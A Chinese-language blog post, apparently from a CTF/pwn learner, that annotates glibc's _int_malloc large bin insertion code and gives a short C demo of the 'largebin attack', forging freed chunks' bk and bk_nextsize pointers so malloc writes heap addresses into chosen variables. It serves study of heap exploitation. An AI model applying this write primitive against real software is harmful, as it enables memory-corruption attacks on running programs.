---
title: largebin_attack 源码分析
date: 2021-08-20 17:14:45
tags:
    - pwn
    - 源码分析
    - how2heap
    - largebin attack
categories:
    - pwn
---
## Large bin attack

### 源码分析
```c
static void *
_int_malloc (mstate av, size_t bytes)
{
    if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
      ...//在现有fastbin中取,若取出则直接返回
    if (in_smallbin_range (nb))
      ... //在现有smallbin中取,若取出则直接返回
    else //in_largebin_range
      ... 
    
    for(;; )
    {
        while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
            if()
                ...

            /* remove from unsorted list */
            unsorted_chunks (av)->bk = bck;
            bck->fd = unsorted_chunks (av);

            if (size == nb)
                return ;
            
            /* place chunk in bin */
            if (in_smallbin_range (size))
            {
                ...
            }
            else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                  if ((unsigned long) (size) < (unsigned long) (bck->bk->size))//bck 指的是main_arena对应的bin
                    {                                                          //这里bck->bk->size是因为bck->bk才是一个chunk，才会有size
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size < fwd->size) //循环遍历是通过fd_nextsize 从大向小遍历的
                        {
                          fwd = fwd->fd_nextsize;
                          assert ((fwd->size & NON_MAIN_ARENA) == 0);
                        }

                      if ((unsigned long) size == (unsigned long) fwd->size)
                        /* Always insert in the second position.  */ //大小相等总是插入第二个位置
                        fwd = fwd->fd;
                      else
                        {
//-------------------------largebin attack-----------------------
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;//faked pointer2
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;//fake pointer2 + 0x20处写入victim
//-------------------------largebin attack-----------------------
                        }
//-------------------------largebin attack-----------------------
                      bck = fwd->bk; //fake pointer1
//-------------------------largebin attack-----------------------
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }
          //前面是找到插入的位置即fwd，bck，当然largebin要提前处理好fd_nextsize bk_nextsize
          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
//-------------------------largebin attack-----------------------
          bck->fd = victim; //fake pointer1 + 0x10处写入victim
//-------------------------largebin attack-----------------------

#define MAX_ITERS       10000
          if (++iters >= MAX_ITERS)
            break;
        }

        
        }
    }
```
* 关于largebin,
  * head->fd是最大的,head->bk是最小的
  * nextsize链表的大小方向是一致的
  * 在插入一个large chunk时,它是通过head从fd向bk遍历，找到合适的位置，进行插入
  * large bin 的head的没有nextsize域,所以nextsize域只能泄露出堆地址,而泄露不出libc地址
* 为了避免循环 应该第二次插入到large bin的victim的size大于原large bin中的被修改过的chunk

### 利用代码

```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<assert.h>
#define mem2chunk(mem) (uint64_t*)(((uint8_t*)mem)-0x10)
int main()
{
	uint64_t var1 = 0,* fake_pointer1;
	uint64_t var2 = 0,* fake_pointer2;

	uint64_t* p1 = malloc(0x200);
	malloc(0x18);
	uint64_t* p2 = malloc(0x440);
	malloc(0x18);
	uint64_t* p3 = malloc(0x460);
	malloc(0x18);


	free(p1);
	free(p2);
	p1 = malloc(0x88);


	p1[0] = 0;//fd
	p1[3] = 0;//fd_nextsize

	fake_pointer1 = &var1-2;
	p2[1] =  (uint64_t)fake_pointer1;//bk

	fake_pointer2 = &var2-4;
	p2[3] =  (uint64_t)fake_pointer2;//bk_nextsize


	free(p1);
	free(p3);
	p1 = malloc(0x88);

	assert(var1 == (uint64_t)mem2chunk(p3));
	assert(var2 == (uint64_t)mem2chunk(p3));
	return 0;
}
```
